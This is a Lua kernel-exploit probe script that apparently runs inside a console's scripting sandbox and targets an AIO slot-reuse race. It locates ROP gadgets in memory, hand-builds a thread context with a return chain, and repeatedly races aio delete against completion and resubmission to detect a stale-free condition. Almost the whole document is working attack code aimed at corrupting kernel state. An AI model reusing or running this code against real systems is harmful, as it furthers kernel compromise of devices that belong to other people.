-- CRASH_CLASS: HIGH
-- PROBE 942a: reclaim the aio slot from under a concurrent delete
--
-- 941b showed a delete on an in-flight object returns EBUSY immediately and does
-- not block, while the same delete after the read completes returns 0 and frees
-- the slot. The 14.20 fix ("reject a reused slot after re-acquiring the lock")
-- implies a window where the deleter has dropped the lock and the slot changes
-- owner. This probe churns that slot deliberately: a child deletes continuously
-- while the parent completes reads and re-submits into the freed slots.

print("=== PROBE 942a: AIO SLOT REUSE RACE ===")
print("")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function hi_lo(v) if type(v)=="table" and v.h then return v.h,v.l end return 0,to_num(v) end
local function show(tag, ok, rv)
    if not ok then print(string.format("  [%s] PCALL-FAIL", tag)) return end
    local h,l=hi_lo(rv) print(string.format("  [%s] ret=0x%08X_%08X", tag, h, l))
end
local function rd(a) local o,v=pcall(function() return to_num(memory.read_dword(a)) end) if o then return v end return -999 end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function addr_of(t) local s=tostring(t) local m=s:match("0x(%x+)") if m then return tonumber(m,16) end return to_num(t) end

local info=memory.alloc(0x200) for i=0,0x1FC,4 do wd(info+i,0) end wd(info,0x160)
pcall(function() mk(593)(uint64(0),uint64(info)) end)
local base=rd(info+0x10C)*4294967296+rd(info+0x108)
local size=rd(info+0x110)
local function find_pat(pat)
    local off=0
    while off<size do
        local want=size-off if want>0x1000 then want=0x1000 end
        local o,s=pcall(function() return memory.read_buffer(base+off,want) end)
        if not o or type(s)~="string" then return nil end
        local i=string.find(s,pat,1,true) if i then return base+off+i-1 end
        off=off+want
    end
end
local fn=to_num(syscall.pipe.fn_addr)
local pop_rax=find_pat(string.char(0x58,0xC3))
local store_rdi=find_pat(string.char(0x48,0x89,0x07,0xC3))
print(string.format("[0] pid=%s base=0x%X", tostring(to_num(mk(20)())), base))
if not pop_rax or not store_rdi then print("[!] gadgets missing"); return end

local Ctx={MAGIC=0x108,TYPE=0x110,CS=0x0C0,RIP=0x0E0,RSP=0x0F8,SS=0x100,RDI=0x048,RSI=0x050,RDX=0x058,RAX=0x078}
local PAGE=0x4000
local function spawn(sysno,a1,a2,a3)
    local block=memory.alloc(PAGE*2)
    for i=0,PAGE*2-4,4 do wd(block+i,0) end
    local ctx=memory.alloc(0x200) for i=0,0x1FC,4 do wd(ctx+i,0) end
    wd(ctx+Ctx.MAGIC,0x480) wd(ctx+Ctx.TYPE,0x10000) wd(ctx+Ctx.CS,0x43) wd(ctx+Ctx.SS,0x3b)
    wq(ctx+Ctx.RIP,uint64(fn)) wq(ctx+Ctx.RSP,uint64(block+PAGE*2-0x200))
    wq(ctx+Ctx.RDI,uint64(a1)) wq(ctx+Ctx.RSI,uint64(a2)) wq(ctx+Ctx.RDX,uint64(a3))
    wq(ctx+Ctx.RAX,uint64(sysno))
    local ch=block+PAGE*2-0x200
    wq(ch,uint64(store_rdi)) wq(ch+8,uint64(pop_rax)) wq(ch+16,uint64(431)) wq(ch+24,uint64(fn))
    return mk(430)(uint64(ctx))
end

local N=4
local sv=memory.alloc(8) wd(sv,0) wd(sv+4,0)
mk(135)(uint64(1),uint64(1),uint64(0),uint64(sv))
local fd0,fd1=rd(sv),rd(sv+4)
print(string.format("  fds=%d,%d", fd0, fd1))
local reqs=memory.alloc(0x28*N) local ids=memory.alloc(8*N) local cids=memory.alloc(8*N)
local st=memory.alloc(8*N) local cerrs=memory.alloc(8*N) local perrs=memory.alloc(8*N)
local buf=memory.alloc(0x1000*N) local ba=addr_of(buf)
local wb=memory.alloc(0x1000*N)
for i=0,0x1000*N-4,4 do wd(wb+i,0x41424344) end
for i=0,0x28*N-1,4 do wd(reqs+i,0) end
for i=0,N-1 do
    local q=reqs+i*0x28
    wd(q+0x08,0x1000)
    wd(q+0x10,(ba+i*0x1000)%4294967296) wd(q+0x14,math.floor((ba+i*0x1000)/4294967296))
    wd(q+0x20,fd0)
end

local dbl=0
for round=1,12 do
    for i=0,N-1 do wd(cerrs+i*4,0xFFFFFFFF) end
    mk(669)(uint64(0x1001),uint64(reqs),uint64(N),uint64(3),uint64(ids))
    for i=0,N-1 do wd(cids+i*4, rd(ids+i*4)) end
    mk(664)(uint64(ids),uint64(N),uint64(st))
    spawn(662, cids, N, cerrs)          -- child hammering delete
    mk(133)(uint64(fd1),uint64(wb),uint64(0x1000*N),uint64(0x80),uint64(0),uint64(0))  -- non-blocking complete
    local rv=mk(662)(uint64(ids),uint64(N),uint64(perrs))  -- parent deletes
    mk(240)(uint64(0),uint64(20000000))
    local cz=0 pz=0
    for i=0,N-1 do
        local c,p=rd(cerrs+i*4), rd(perrs+i*4)
        if c==0 then cz=cz+1 end
        if p==0 then pz=pz+1 end
    end
    -- a fresh object must still work; if a stale delete freed it, this fails
    local rid=memory.alloc(8) local rst=memory.alloc(8) local r2=memory.alloc(0x28)
    for i=0,0x24,4 do wd(r2+i,0) end
    mk(669)(uint64(0x1001),uint64(r2),uint64(1),uint64(3),uint64(rid))
    local id2=rd(rid)
    mk(662)(uint64(rid),uint64(1),uint64(rst))
    local del=rd(rst)
    if id2==0 or del==0x80020003 then dbl=dbl+1 end
    if round<=6 or dbl>0 then
        print(string.format("  [r%d] child_zero=%d parent_zero=%d fresh=0x%08X freshdel=0x%08X", round, cz, pz, id2 or 0, del))
    end
    mk(240)(uint64(0),uint64(20000000))
end
print(string.format("[Z] anomalous rounds=%d alive pid=%s", dbl, tostring(to_num(mk(20)()))))
print("=== COMPLETE ===")
